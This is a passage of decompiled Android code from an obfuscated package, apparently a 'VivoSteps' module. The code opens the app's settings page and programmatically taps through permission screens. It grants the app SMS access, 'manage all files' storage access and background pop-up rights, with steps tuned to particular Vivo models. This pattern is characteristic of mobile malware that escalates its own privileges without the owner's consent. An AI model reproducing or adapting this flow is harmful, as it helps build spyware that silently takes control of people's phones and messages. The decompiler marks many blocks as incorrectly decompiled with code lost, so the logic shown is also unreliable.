        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212402c0(String str, ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$executeFlowA$1 vivoSteps$executeFlowA$1;
        C0371a8 c0371a8;
        if (continuationImpl instanceof VivoSteps$executeFlowA$1) {
            vivoSteps$executeFlowA$1 = (VivoSteps$executeFlowA$1) continuationImpl;
            int i = vivoSteps$executeFlowA$1.f54874a4;
            if ((i & Integer.MIN_VALUE) != 0) {
                vivoSteps$executeFlowA$1.f54874a4 = i - Integer.MIN_VALUE;
            } else {
                vivoSteps$executeFlowA$1 = new VivoSteps$executeFlowA$1(this, continuationImpl);
            }
        }
        Object objM212408c6 = vivoSteps$executeFlowA$1.f54872a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i2 = vivoSteps$executeFlowA$1.f54874a4;
        if (i2 == 0) {
            kg1.m213544f4(objM212408c6);
            vivoSteps$executeFlowA$1.f54870a0 = this;
            vivoSteps$executeFlowA$1.f54871a1 = str;
            vivoSteps$executeFlowA$1.f54874a4 = 1;
            objM212408c6 = m212408c6(vivoSteps$executeFlowA$1);
            if (objM212408c6 != coroutineSingletons) {
                c0371a8 = this;
            }
            return coroutineSingletons;
        }
        if (i2 == 1) {
            str = vivoSteps$executeFlowA$1.f54871a1;
            c0371a8 = vivoSteps$executeFlowA$1.f54870a0;
            kg1.m213544f4(objM212408c6);
        } else {
            if (i2 != 2) {
                if (i2 != 3) {
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
                }
                kg1.m213544f4(objM212408c6);
                return !((Boolean) objM212408c6).booleanValue() ? Boolean.FALSE : Boolean.TRUE;
            }
            str = vivoSteps$executeFlowA$1.f54871a1;
            c0371a8 = vivoSteps$executeFlowA$1.f54870a0;
            kg1.m213544f4(objM212408c6);
            if (((Boolean) objM212408c6).booleanValue()) {
                return Boolean.FALSE;
            }
            vivoSteps$executeFlowA$1.f54870a0 = null;
            vivoSteps$executeFlowA$1.f54871a1 = null;
            vivoSteps$executeFlowA$1.f54874a4 = 3;
            objM212408c6 = c0371a8.m212407c5(str, vivoSteps$executeFlowA$1);
        }
        if (!((Boolean) objM212408c6).booleanValue()) {
            return Boolean.FALSE;
        }
        vivoSteps$executeFlowA$1.f54870a0 = c0371a8;
        vivoSteps$executeFlowA$1.f54871a1 = str;
        vivoSteps$executeFlowA$1.f54874a4 = 2;
        objM212408c6 = c0371a8.m212396b4(vivoSteps$executeFlowA$1);
        if (objM212408c6 != coroutineSingletons) {
            if (((Boolean) objM212408c6).booleanValue()) {
            }
        }
        return coroutineSingletons;
    }

    /* JADX WARN: Code restructure failed: missing block: B:107:0x0286, code lost:
    
        if (r0 == r3) goto L188;
     */
    /* JADX WARN: Code restructure failed: missing block: B:122:0x02cd, code lost:
    
        if (r0 == r3) goto L188;
     */
    /* JADX WARN: Code restructure failed: missing block: B:148:0x0347, code lost:
    
        if (p000.b81.m210571b1(100, r2) != r3) goto L150;
     */
    /* JADX WARN: Code restructure failed: missing block: B:164:0x0399, code lost:
    
        if (r0 == r3) goto L188;
     */
    /* JADX WARN: Code restructure failed: missing block: B:187:0x0401, code lost:
    
        if (p000.b81.m210571b1(200, r2) != r3) goto L189;
     */
    /* JADX WARN: Code restructure failed: missing block: B:76:0x01f5, code lost:
    
        if (r0 == r3) goto L188;
     */
    /* JADX WARN: Removed duplicated region for block: B:101:0x025e A[PHI: r4 r11
      0x025e: PHI (r4v23 java.lang.String) = (r4v21 java.lang.String), (r4v24 java.lang.String) binds: [B:99:0x025a, B:33:0x00dc] A[DONT_GENERATE, DONT_INLINE]
      0x025e: PHI (r11v24 com.storm.safe.rock.service.modules.yw5xud.a8) = (r11v22 com.storm.safe.rock.service.modules.yw5xud.a8), (r11v25 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:99:0x025a, B:33:0x00dc] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:104:0x0270 A[PHI: r0 r4 r11
      0x0270: PHI (r0v54 java.lang.Object) = (r0v53 java.lang.Object), (r0v1 java.lang.Object) binds: [B:102:0x026c, B:32:0x00d3] A[DONT_GENERATE, DONT_INLINE]
      0x0270: PHI (r4v25 java.lang.String) = (r4v23 java.lang.String), (r4v26 java.lang.String) binds: [B:102:0x026c, B:32:0x00d3] A[DONT_GENERATE, DONT_INLINE]
      0x0270: PHI (r11v26 com.storm.safe.rock.service.modules.yw5xud.a8) = (r11v24 com.storm.safe.rock.service.modules.yw5xud.a8), (r11v27 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:102:0x026c, B:32:0x00d3] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:106:0x0278  */
    /* JADX WARN: Removed duplicated region for block: B:113:0x0295 A[PHI: r4 r11
      0x0295: PHI (r4v27 java.lang.String) = (r4v25 java.lang.String), (r4v28 java.lang.String) binds: [B:105:0x0276, B:110:0x0290] A[DONT_GENERATE, DONT_INLINE]
      0x0295: PHI (r11v28 com.storm.safe.rock.service.modules.yw5xud.a8) = (r11v26 com.storm.safe.rock.service.modules.yw5xud.a8), (r11v29 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:105:0x0276, B:110:0x0290] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:116:0x02a5 A[PHI: r4 r11
      0x02a5: PHI (r4v30 java.lang.String) = (r4v27 java.lang.String), (r4v31 java.lang.String) binds: [B:114:0x02a1, B:30:0x00c1] A[DONT_GENERATE, DONT_INLINE]
      0x02a5: PHI (r11v31 com.storm.safe.rock.service.modules.yw5xud.a8) = (r11v28 com.storm.safe.rock.service.modules.yw5xud.a8), (r11v32 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:114:0x02a1, B:30:0x00c1] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:119:0x02b7 A[PHI: r0 r4 r11
      0x02b7: PHI (r0v69 java.lang.Object) = (r0v68 java.lang.Object), (r0v1 java.lang.Object) binds: [B:117:0x02b3, B:29:0x00b8] A[DONT_GENERATE, DONT_INLINE]
      0x02b7: PHI (r4v32 java.lang.String) = (r4v30 java.lang.String), (r4v33 java.lang.String) binds: [B:117:0x02b3, B:29:0x00b8] A[DONT_GENERATE, DONT_INLINE]
      0x02b7: PHI (r11v33 com.storm.safe.rock.service.modules.yw5xud.a8) = (r11v31 com.storm.safe.rock.service.modules.yw5xud.a8), (r11v34 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:117:0x02b3, B:29:0x00b8] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:121:0x02bf  */
    /* JADX WARN: Removed duplicated region for block: B:128:0x02dc A[PHI: r4 r11
      0x02dc: PHI (r4v34 java.lang.String) = (r4v32 java.lang.String), (r4v35 java.lang.String) binds: [B:120:0x02bd, B:125:0x02d7] A[DONT_GENERATE, DONT_INLINE]
      0x02dc: PHI (r11v35 com.storm.safe.rock.service.modules.yw5xud.a8) = (r11v33 com.storm.safe.rock.service.modules.yw5xud.a8), (r11v36 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:120:0x02bd, B:125:0x02d7] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:131:0x02ec A[PHI: r4 r11
      0x02ec: PHI (r4v37 java.lang.String) = (r4v34 java.lang.String), (r4v38 java.lang.String) binds: [B:129:0x02e8, B:27:0x00a6] A[DONT_GENERATE, DONT_INLINE]
      0x02ec: PHI (r11v38 com.storm.safe.rock.service.modules.yw5xud.a8) = (r11v35 com.storm.safe.rock.service.modules.yw5xud.a8), (r11v39 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:129:0x02e8, B:27:0x00a6] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:133:0x02f2  */
    /* JADX WARN: Removed duplicated region for block: B:139:0x0316 A[PHI: r4 r11
      0x0316: PHI (r4v41 java.lang.String) = (r4v37 java.lang.String), (r4v39 java.lang.String), (r4v42 java.lang.String) binds: [B:132:0x02f0, B:137:0x0312, B:25:0x0094] A[DONT_GENERATE, DONT_INLINE]
      0x0316: PHI (r11v42 com.storm.safe.rock.service.modules.yw5xud.a8) = 
      (r11v38 com.storm.safe.rock.service.modules.yw5xud.a8)
      (r11v40 com.storm.safe.rock.service.modules.yw5xud.a8)
      (r11v43 com.storm.safe.rock.service.modules.yw5xud.a8)
     binds: [B:132:0x02f0, B:137:0x0312, B:25:0x0094] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:146:0x0338  */
    /* JADX WARN: Removed duplicated region for block: B:14:0x003e  */
    /* JADX WARN: Removed duplicated region for block: B:154:0x035c  */
    /* JADX WARN: Removed duplicated region for block: B:158:0x036d A[PHI: r4 r6
      0x036d: PHI (r4v50 java.lang.String) = (r4v48 java.lang.String), (r4v51 java.lang.String) binds: [B:156:0x0369, B:21:0x0070] A[DONT_GENERATE, DONT_INLINE]
      0x036d: PHI (r6v9 com.storm.safe.rock.service.modules.yw5xud.a8) = (r6v7 com.storm.safe.rock.service.modules.yw5xud.a8), (r6v10 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:156:0x0369, B:21:0x0070] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:163:0x0389  */
    /* JADX WARN: Removed duplicated region for block: B:170:0x03a7 A[PHI: r4 r5
      0x03a7: PHI (r4v54 java.lang.String) = (r4v52 java.lang.String), (r4v55 java.lang.String) binds: [B:162:0x0387, B:167:0x03a2] A[DONT_GENERATE, DONT_INLINE]
      0x03a7: PHI (r5v11 com.storm.safe.rock.service.modules.yw5xud.a8) = (r5v10 com.storm.safe.rock.service.modules.yw5xud.a8), (r5v12 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:162:0x0387, B:167:0x03a2] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:173:0x03b6 A[PHI: r4 r5
      0x03b6: PHI (r4v57 java.lang.String) = (r4v54 java.lang.String), (r4v58 java.lang.String) binds: [B:171:0x03b3, B:17:0x0054] A[DONT_GENERATE, DONT_INLINE]
      0x03b6: PHI (r5v14 com.storm.safe.rock.service.modules.yw5xud.a8) = (r5v11 com.storm.safe.rock.service.modules.yw5xud.a8), (r5v15 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:171:0x03b3, B:17:0x0054] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:176:0x03ca A[PHI: r0 r4 r5
      0x03ca: PHI (r0v115 java.lang.Object) = (r0v114 java.lang.Object), (r0v1 java.lang.Object) binds: [B:174:0x03c7, B:16:0x004b] A[DONT_GENERATE, DONT_INLINE]
      0x03ca: PHI (r4v59 java.lang.String) = (r4v57 java.lang.String), (r4v60 java.lang.String) binds: [B:174:0x03c7, B:16:0x004b] A[DONT_GENERATE, DONT_INLINE]
      0x03ca: PHI (r5v16 com.storm.safe.rock.service.modules.yw5xud.a8) = (r5v14 com.storm.safe.rock.service.modules.yw5xud.a8), (r5v17 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:174:0x03c7, B:16:0x004b] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:178:0x03d2  */
    /* JADX WARN: Removed duplicated region for block: B:180:0x03dc  */
    /* JADX WARN: Removed duplicated region for block: B:20:0x006d A[PHI: r0 r4 r6
      0x006d: PHI (r0v100 java.lang.Object) = (r0v99 java.lang.Object), (r0v1 java.lang.Object) binds: [B:159:0x037d, B:19:0x0066] A[DONT_GENERATE, DONT_INLINE]
      0x006d: PHI (r4v52 java.lang.String) = (r4v50 java.lang.String), (r4v53 java.lang.String) binds: [B:159:0x037d, B:19:0x0066] A[DONT_GENERATE, DONT_INLINE]
      0x006d: PHI (r6v11 com.storm.safe.rock.service.modules.yw5xud.a8) = (r6v9 com.storm.safe.rock.service.modules.yw5xud.a8), (r6v13 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:159:0x037d, B:19:0x0066] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:55:0x0193  */
    /* JADX WARN: Removed duplicated region for block: B:57:0x0196  */
    /* JADX WARN: Removed duplicated region for block: B:63:0x01b6 A[PHI: r0 r4 r11
      0x01b6: PHI (r0v18 java.lang.Object) = (r0v17 java.lang.Object), (r0v1 java.lang.Object) binds: [B:61:0x01b2, B:41:0x0124] A[DONT_GENERATE, DONT_INLINE]
      0x01b6: PHI (r4v6 java.lang.String) = (r4v4 java.lang.String), (r4v7 java.lang.String) binds: [B:61:0x01b2, B:41:0x0124] A[DONT_GENERATE, DONT_INLINE]
      0x01b6: PHI (r11v7 com.storm.safe.rock.service.modules.yw5xud.a8) = (r11v5 com.storm.safe.rock.service.modules.yw5xud.a8), (r11v8 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:61:0x01b2, B:41:0x0124] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:65:0x01be  */
    /* JADX WARN: Removed duplicated region for block: B:67:0x01c1  */
    /* JADX WARN: Removed duplicated region for block: B:73:0x01e0 A[PHI: r0 r4 r11
      0x01e0: PHI (r0v26 java.lang.Object) = (r0v25 java.lang.Object), (r0v1 java.lang.Object) binds: [B:71:0x01dc, B:39:0x0112] A[DONT_GENERATE, DONT_INLINE]
      0x01e0: PHI (r4v10 java.lang.String) = (r4v8 java.lang.String), (r4v11 java.lang.String) binds: [B:71:0x01dc, B:39:0x0112] A[DONT_GENERATE, DONT_INLINE]
      0x01e0: PHI (r11v11 com.storm.safe.rock.service.modules.yw5xud.a8) = (r11v9 com.storm.safe.rock.service.modules.yw5xud.a8), (r11v12 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:71:0x01dc, B:39:0x0112] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:75:0x01e8  */
    /* JADX WARN: Removed duplicated region for block: B:79:0x01ff A[PHI: r0 r4 r11
      0x01ff: PHI (r0v32 boolean) = (r0v28 boolean), (r0v38 boolean) binds: [B:74:0x01e6, B:78:0x01f9] A[DONT_GENERATE, DONT_INLINE]
      0x01ff: PHI (r4v12 java.lang.String) = (r4v10 java.lang.String), (r4v13 java.lang.String) binds: [B:74:0x01e6, B:78:0x01f9] A[DONT_GENERATE, DONT_INLINE]
      0x01ff: PHI (r11v13 com.storm.safe.rock.service.modules.yw5xud.a8) = (r11v11 com.storm.safe.rock.service.modules.yw5xud.a8), (r11v14 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:74:0x01e6, B:78:0x01f9] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0017  */
    /* JADX WARN: Removed duplicated region for block: B:80:0x0201  */
    /* JADX WARN: Removed duplicated region for block: B:82:0x0204  */
    /* JADX WARN: Removed duplicated region for block: B:88:0x0223 A[PHI: r0 r4 r11
      0x0223: PHI (r0v41 java.lang.Object) = (r0v40 java.lang.Object), (r0v1 java.lang.Object) binds: [B:86:0x021f, B:36:0x00f7] A[DONT_GENERATE, DONT_INLINE]
      0x0223: PHI (r4v17 java.lang.String) = (r4v15 java.lang.String), (r4v18 java.lang.String) binds: [B:86:0x021f, B:36:0x00f7] A[DONT_GENERATE, DONT_INLINE]
      0x0223: PHI (r11v18 com.storm.safe.rock.service.modules.yw5xud.a8) = (r11v16 com.storm.safe.rock.service.modules.yw5xud.a8), (r11v19 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:86:0x021f, B:36:0x00f7] A[DONT_GENERATE, DONT_INLINE]] */
    /* JADX WARN: Removed duplicated region for block: B:90:0x022b  */
    /* JADX WARN: Removed duplicated region for block: B:92:0x022e  */
    /* JADX WARN: Removed duplicated region for block: B:98:0x024e A[PHI: r4 r11
      0x024e: PHI (r4v21 java.lang.String) = (r4v19 java.lang.String), (r4v22 java.lang.String) binds: [B:96:0x024a, B:34:0x00e5] A[DONT_GENERATE, DONT_INLINE]
      0x024e: PHI (r11v22 com.storm.safe.rock.service.modules.yw5xud.a8) = (r11v20 com.storm.safe.rock.service.modules.yw5xud.a8), (r11v23 com.storm.safe.rock.service.modules.yw5xud.a8) binds: [B:96:0x024a, B:34:0x00e5] A[DONT_GENERATE, DONT_INLINE]] */
    /* renamed from: c1 */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final Object m212403c1(String str, ContinuationImpl continuationImpl) throws Throwable {
        VivoSteps$executeFlowB$1 vivoSteps$executeFlowB$1;
        String str2;
        boolean z;
        C0371a8 c0371a8;
        boolean zBooleanValue;
        String str3;
        C0371a8 c0371a82;
        C0371a8 c0371a83;
        C0371a8 c0371a84;
        if (continuationImpl instanceof VivoSteps$executeFlowB$1) {
            vivoSteps$executeFlowB$1 = (VivoSteps$executeFlowB$1) continuationImpl;
            int i = vivoSteps$executeFlowB$1.f54879a4;
            if ((i & Integer.MIN_VALUE) != 0) {
                vivoSteps$executeFlowB$1.f54879a4 = i - Integer.MIN_VALUE;
            } else {
                vivoSteps$executeFlowB$1 = new VivoSteps$executeFlowB$1(this, continuationImpl);
            }
        }
        Object objValueOf = vivoSteps$executeFlowB$1.f54877a2;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        switch (vivoSteps$executeFlowB$1.f54879a4) {
            case 0:
                kg1.m213544f4(objValueOf);
                vivoSteps$executeFlowB$1.f54875a0 = this;
                str2 = str;
                vivoSteps$executeFlowB$1.f54876a1 = str2;
                vivoSteps$executeFlowB$1.f54879a4 = 1;
                Context context = this.f55140a1;
                try {
                    Intent intent = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
                    intent.setData(Uri.parse("package:" + context.getPackageName()));
                    intent.setFlags(276824064);
                    context.startActivity(intent);
                    z = true;
                } catch (Exception e) {
                    tz0.m214807a7("[Vivo] ❌ 打开应用详情失败: ", e.getMessage(), this.f55141a2);
                    z = false;
                }
                objValueOf = Boolean.valueOf(z);
                if (objValueOf != coroutineSingletons) {
                    c0371a8 = this;
                    if (((Boolean) objValueOf).booleanValue()) {
                        return Boolean.FALSE;
                    }
                    vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                    vivoSteps$executeFlowB$1.f54876a1 = str2;
                    vivoSteps$executeFlowB$1.f54879a4 = 2;
                    if (b81.m210571b1(500L, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                        vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                        vivoSteps$executeFlowB$1.f54876a1 = str2;
                        vivoSteps$executeFlowB$1.f54879a4 = 3;
                        objValueOf = c0371a8.m212393b0("权限", 0, 5, vivoSteps$executeFlowB$1);
                        if (objValueOf != coroutineSingletons) {
                            if (((Boolean) objValueOf).booleanValue()) {
                                return Boolean.FALSE;
                            }
                            vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                            vivoSteps$executeFlowB$1.f54876a1 = str2;
                            vivoSteps$executeFlowB$1.f54879a4 = 4;
                            if (b81.m210571b1(200L, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                                vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                                vivoSteps$executeFlowB$1.f54876a1 = str2;
                                vivoSteps$executeFlowB$1.f54879a4 = 5;
                                objValueOf = c0371a8.m212393b0("短信", 0, 5, vivoSteps$executeFlowB$1);
                                if (objValueOf != coroutineSingletons) {
                                    zBooleanValue = ((Boolean) objValueOf).booleanValue();
                                    if (zBooleanValue) {
                                        vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                                        vivoSteps$executeFlowB$1.f54876a1 = str2;
                                        vivoSteps$executeFlowB$1.f54879a4 = 6;
                                        objValueOf = c0371a8.m212393b0("SMS", 0, 5, vivoSteps$executeFlowB$1);
                                        break;
                                    } else {
                                        if (zBooleanValue) {
                                            return Boolean.FALSE;
                                        }
                                        vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                                        vivoSteps$executeFlowB$1.f54876a1 = str2;
                                        vivoSteps$executeFlowB$1.f54879a4 = 7;
                                        if (b81.m210571b1(200L, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                                            vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                                            vivoSteps$executeFlowB$1.f54876a1 = str2;
                                            vivoSteps$executeFlowB$1.f54879a4 = 8;
                                            objValueOf = c0371a8.m212393b0("允许", 0, 5, vivoSteps$executeFlowB$1);
                                            if (objValueOf != coroutineSingletons) {
                                                if (((Boolean) objValueOf).booleanValue()) {
                                                    return Boolean.FALSE;
                                                }
                                                vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                                                vivoSteps$executeFlowB$1.f54876a1 = str2;
                                                vivoSteps$executeFlowB$1.f54879a4 = 9;
                                                if (b81.m210571b1(200L, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                                                    vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                                                    vivoSteps$executeFlowB$1.f54876a1 = str2;
                                                    vivoSteps$executeFlowB$1.f54879a4 = 10;
                                                    if (c0371a8.m212407c5(str2, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                                                        vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                                                        vivoSteps$executeFlowB$1.f54876a1 = str2;
                                                        vivoSteps$executeFlowB$1.f54879a4 = 11;
                                                        if (b81.m210571b1(200L, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                                                            vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                                                            vivoSteps$executeFlowB$1.f54876a1 = str2;
                                                            vivoSteps$executeFlowB$1.f54879a4 = 12;
                                                            objValueOf = c0371a8.m212393b0("存储#文件与文档", 0, 5, vivoSteps$executeFlowB$1);
                                                            if (objValueOf != coroutineSingletons) {
                                                                if (((Boolean) objValueOf).booleanValue()) {
                                                                    vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                                                                    vivoSteps$executeFlowB$1.f54876a1 = str2;
                                                                    vivoSteps$executeFlowB$1.f54879a4 = 13;
                                                                    objValueOf = c0371a8.m212393b0("存储", 0, 5, vivoSteps$executeFlowB$1);
                                                                    break;
                                                                } else {
                                                                    vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                                                                    vivoSteps$executeFlowB$1.f54876a1 = str2;
                                                                    vivoSteps$executeFlowB$1.f54879a4 = 14;
                                                                    if (b81.m210571b1(200L, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                                                                        vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                                                                        vivoSteps$executeFlowB$1.f54876a1 = str2;
                                                                        vivoSteps$executeFlowB$1.f54879a4 = 15;
                                                                        objValueOf = c0371a8.m212393b0("允许管理所有文件#允许#仅允许访问媒体文件", 0, 5, vivoSteps$executeFlowB$1);
                                                                        if (objValueOf != coroutineSingletons) {
                                                                            if (((Boolean) objValueOf).booleanValue()) {
                                                                                vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                                                                                vivoSteps$executeFlowB$1.f54876a1 = str2;
                                                                                vivoSteps$executeFlowB$1.f54879a4 = 16;
                                                                                objValueOf = c0371a8.m212393b0("允许管理所有文件", 0, 5, vivoSteps$executeFlowB$1);
                                                                                break;
                                                                            } else {
                                                                                vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                                                                                vivoSteps$executeFlowB$1.f54876a1 = str2;
                                                                                vivoSteps$executeFlowB$1.f54879a4 = 17;
                                                                                if (b81.m210571b1(200L, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                                                                                    if (Build.VERSION.SDK_INT != 33) {
                                                                                        vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                                                                                        vivoSteps$executeFlowB$1.f54876a1 = str2;
                                                                                        vivoSteps$executeFlowB$1.f54879a4 = 18;
                                                                                        if (c0371a8.m212393b0("确定", 0, 5, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                                                                                            vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                                                                                            vivoSteps$executeFlowB$1.f54876a1 = str2;
                                                                                            vivoSteps$executeFlowB$1.f54879a4 = 19;
                                                                                            if (b81.m210571b1(100L, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                                                                                                str3 = Build.MODEL;
                                                                                                if (AbstractC0779a1.m213656a9(str3, "V2106A") && !AbstractC0779a1.m213656a9(str3, "V2054A")) {
                                                                                                    vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                                                                                                    vivoSteps$executeFlowB$1.f54876a1 = str2;
                                                                                                    vivoSteps$executeFlowB$1.f54879a4 = 22;
                                                                                                    if (c0371a8.m212407c5(str2, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                                                                                                        c0371a83 = c0371a8;
                                                                                                        vivoSteps$executeFlowB$1.f54875a0 = c0371a83;
                                                                                                        vivoSteps$executeFlowB$1.f54876a1 = str2;
                                                                                                        vivoSteps$executeFlowB$1.f54879a4 = 23;
                                                                                                        if (b81.m210571b1(200L, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                                                                                                            vivoSteps$executeFlowB$1.f54875a0 = c0371a83;
                                                                                                            vivoSteps$executeFlowB$1.f54876a1 = str2;
                                                                                                            vivoSteps$executeFlowB$1.f54879a4 = 24;
                                                                                                            objValueOf = c0371a83.m212393b0("单项权限设置#所有权限", Buffer.SEGMENTING_THRESHOLD, 5, vivoSteps$executeFlowB$1);
                                                                                                            if (objValueOf != coroutineSingletons) {
                                                                                                                c0371a84 = c0371a83;
                                                                                                                if (!((Boolean) objValueOf).booleanValue()) {
                                                                                                                    vivoSteps$executeFlowB$1.f54875a0 = c0371a84;
                                                                                                                    vivoSteps$executeFlowB$1.f54876a1 = str2;
                                                                                                                    vivoSteps$executeFlowB$1.f54879a4 = 26;
                                                                                                                    if (b81.m210571b1(200L, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                                                                                                                        vivoSteps$executeFlowB$1.f54875a0 = c0371a84;
                                                                                                                        vivoSteps$executeFlowB$1.f54876a1 = str2;
                                                                                                                        vivoSteps$executeFlowB$1.f54879a4 = 27;
                                                                                                                        objValueOf = c0371a84.m212430f8(30, "后台弹出界面", vivoSteps$executeFlowB$1, true);
                                                                                                                        if (objValueOf != coroutineSingletons) {
                                                                                                                            if (!((Boolean) objValueOf).booleanValue()) {
                                                                                                                                vivoSteps$executeFlowB$1.f54875a0 = c0371a84;
                                                                                                                                vivoSteps$executeFlowB$1.f54876a1 = str2;
                                                                                                                                vivoSteps$executeFlowB$1.f54879a4 = 28;
                                                                                                                                if (b81.m210571b1(500L, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                                                                                                                                    vivoSteps$executeFlowB$1.f54875a0 = null;
                                                                                                                                    vivoSteps$executeFlowB$1.f54876a1 = null;
                                                                                                                                    vivoSteps$executeFlowB$1.f54879a4 = 29;
                                                                                                                                    if (c0371a84.m212407c5(str2, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                                                                                                                                        vivoSteps$executeFlowB$1.f54879a4 = 30;
                                                                                                                                        break;
                                                                                                                                    }
                                                                                                                                }
                                                                                                                            } else {
                                                                                                                                t60.m214704c5(c0371a84.f55141a2, "[Vivo流程B] ❌ 后台弹出界面开关切换失败");
                                                                                                                                return Boolean.FALSE;
                                                                                                                            }
                                                                                                                        }
                                                                                                                    }
                                                                                                                } else {
                                                                                                                    vivoSteps$executeFlowB$1.f54875a0 = c0371a84;
                                                                                                                    vivoSteps$executeFlowB$1.f54876a1 = str2;
                                                                                                                    vivoSteps$executeFlowB$1.f54879a4 = 25;
                                                                                                                    objValueOf = c0371a84.m212393b0("单项权限设置", Buffer.SEGMENTING_THRESHOLD, 5, vivoSteps$executeFlowB$1);
                                                                                                                    break;
                                                                                                                }
                                                                                                            }
                                                                                                        }
                                                                                                    }
                                                                                                } else {
                                                                                                    vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                                                                                                    vivoSteps$executeFlowB$1.f54876a1 = str2;
                                                                                                    vivoSteps$executeFlowB$1.f54879a4 = 20;
                                                                                                    if (c0371a8.m212393b0("允许", 0, 5, vivoSteps$executeFlowB$1) != coroutineSingletons) {
                                                                                                        c0371a82 = c0371a8;
                                                                                                        vivoSteps$executeFlowB$1.f54875a0 = c0371a82;
                                                                                                        vivoSteps$executeFlowB$1.f54876a1 = str2;
                                                                                                        vivoSteps$executeFlowB$1.f54879a4 = 21;
                                                                                                        break;
                                                                                                    }
                                                                                                }
                                                                                            }
                                                                                        }
                                                                                    }
                                                                                }
                                                                            }
                                                                        }
                                                                    }
                                                                }
                                                            }
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                return coroutineSingletons;
            case 1:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a8 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                if (((Boolean) objValueOf).booleanValue()) {
                }
                break;
            case 2:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a8 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
                vivoSteps$executeFlowB$1.f54875a0 = c0371a8;
                vivoSteps$executeFlowB$1.f54876a1 = str2;
                vivoSteps$executeFlowB$1.f54879a4 = 3;
                objValueOf = c0371a8.m212393b0("权限", 0, 5, vivoSteps$executeFlowB$1);
                if (objValueOf != coroutineSingletons) {
                }
                return coroutineSingletons;
            case 3:
                str2 = vivoSteps$executeFlowB$1.f54876a1;
                c0371a8 = vivoSteps$executeFlowB$1.f54875a0;
                kg1.m213544f4(objValueOf);
